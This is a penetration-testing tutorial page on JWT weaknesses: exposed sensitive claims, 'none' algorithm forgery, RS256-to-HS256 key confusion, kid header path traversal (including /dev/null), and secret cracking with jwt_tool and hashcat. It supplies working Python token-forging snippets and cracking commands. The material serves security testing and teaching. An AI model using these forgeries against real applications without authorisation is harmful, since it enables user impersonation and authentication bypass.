# Insecure JSON Web Tokens

## Theory

Some web applications rely on JSON Web Tokens (JWTs) for stateless authentication and access control instead of stateful ones with traditional session cookies. Some implementations are insecure and allow attackers to bypass controls, impersonate users, or retrieve secrets.

## Practice

Testers need to find if, and where, the tokens are used. A JWT is a base64 string of at least 100 characters, made of three parts (header, payload, signature) separated by dot, and usually located in `Authorization` headers with the `Bearer` keyword. See the the following example.

```
Authorization: Bearer eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]
```

Once the tokens are found, testers need to assess their implementation's security by attempting some known attacks and flaws.

### Sensitive data

JWTs are just base64 encoded data. They may contain sensitive unencrypted information.

### Signature attack - None algorithm

Testers need to decode the token, change the algorithm to `None` (or `none`, `NONE`, `nOnE`) in the header, remove the signature, and send the modified token. Some applications are vulnerable to this attack since some support a None algorithm for signature.

This can be done in Python.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
new_token = jwt.encode(old_token_payload, key='', algorithm=None)
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

```python
import jwt
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key='', algorithm=None)
print(token)
```

### Signature attack - RS256 to HS256

If the algorithm used to sign the payload is RS256, testers can try to use HS256 instead. Instead of signing the JWT payload with a private key, using HS256 will make the web app sign it with a public key that can sometimes be easily obtained.

{% hint style="info" %}
Some applications re-use their TLS certificate for JWT operations. The TLS certificate's public key used by a server can be obtained with the following command.

```bash
echo | openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout > pubkey.pem
```
{% endhint %}

The following Python code can be used to identify if the web application is vulnerable to this attack.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
public_key = open('pubkey.pem', 'r').read()
new_token = jwt.encode(old_token_payload, key=public_key, algorithm='HS256')
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

{% hint style="warning" %}
The jwt library imported in the following Python code raises an exception when attempting to use an asymmetric key or x509 certificate as an HMAC secret. Testers need to install version 0.4.3 `pip/pip3 install pyjwt==0.4.3`.
{% endhint %}

```python
import jwt
public_key = open('pubkey.pem', 'r').read()
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key=public_key, algorithm='HS256')
print(token)
```

### Signature attack - KID header path traversal

The [kid](https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4) (Key ID) is an optional parameter specified in the JWT header part to indicate the key used for signature validation in case there are multiple ones.

The structure of this ID is not specified and it can be any string value (case-sensitive).&#x20;

The last part is interesting because, if the parameter is vulnerable to [directory traversal](../../web-services/attacks-on-inputs/directory-traversal.md), this would allow to perform path traversal and point to a file `path/file` with content we can guess or known somehow, and use its content as the value of the signing key.

{% hint style="info" %}
> There are a bunch of files in /sys that are basically flags. Like the flag that says if ftrace is enabled is either 0 or 1. So the attacker just creates 2 tokens with that as the key and one of them will work!
>
> _(By_ [_Intigriti_](https://twitter.com/intigriti) _on_ [_Twitter_](https://twitter.com/intigriti/status/1618653959752925184)_)_

The example mentioned above is located at `/proc/sys/kernel/ftrace_enabled`
{% endhint %}

This can be done in Python.

{% code overflow="wrap" lineNumbers="true" %}
```python
import jwt
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key='file-content', algorithm='HS256', headers={"kid": "../../../path/to/file"})
print(token)
```
{% endcode %}

#### Special case: `file=/dev/null`

The signature validation can be bypassed by pointing to `/dev/null` which will return an empty string, meaning that an empty key could be used for signature.

{% hint style="info" %}
"[JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)" PortSwigger lab provides more insight on this technique.
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```python
import jwt
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key='', algorithm='HS256', headers={"kid": "../../../dev/null"})
print(token)
```
{% endcode %}

{% hint style="info" %}
If Burp is used to craft the JWT token, a symmetric key with value of the `k` property in the JWT equal to `AA==` (base64 value of null byte) must be created.&#x20;

The same secret value is to be used on [jwt.io](https://jwt.io/).&#x20;
{% endhint %}

### Cracking the secret

When JWT uses `HMAC-SHA256`/`384`/`512` algorithms to sign the payload, testers can try to find the secret if weak enough.

[JWT tool](https://github.com/ticarpi/jwt\_tool) (Python3) can be used for this purpose.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># crack the secret using dictionnary attack
<strong>jwt_tool.py -v -C -d $wordlist_file "$JWT_value"
</strong><strong>
</strong># use the secret to tapmer (-T option) the token
# running this command will show up a menu to choose the value to tamper
# the result token will be signed with the submited secret using the specified singing algorithm "alg" (hs256/hs384/hs512 = HMAC-SHA signing).
<strong>jwt_tool.py -v -S $alg -p "$secret" -T "$JWT_value"
</strong></code></pre>

JWT secrets can also be cracked using hashcat (see the [AD credential cracking](../../ad/movement/credentials/cracking.md) page for more detailed info on how to use it).

```bash
hashcat --hash-type 16500 --attack-mode 0 $JWTs_file $wordlist_file
```

### Recovering the public key

In certain scenarios, public keys can be recovered when knowing one (for algos `ES256`, `ES384`, `ES512`) or two (for algos `RS256`, `RS384`, `RS512`) tokens.

This can be achieved with the following Python script : [JWT-Key-Recover](https://github.com/FlorianPicca/JWT-Key-Recovery)

## References

{% embed url="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" %}

{% embed url="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" %}

{% embed url="https://blog.imaginea.com/stateless-authentication-using-jwt-2/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" %}

{% embed url="https://jwt.io/" %}

{% embed url="https://portswigger.net/web-security/jwt" %}

{% embed url="https://systemweakness.com/deep-dive-into-jwt-attacks-efc607858af6" %}
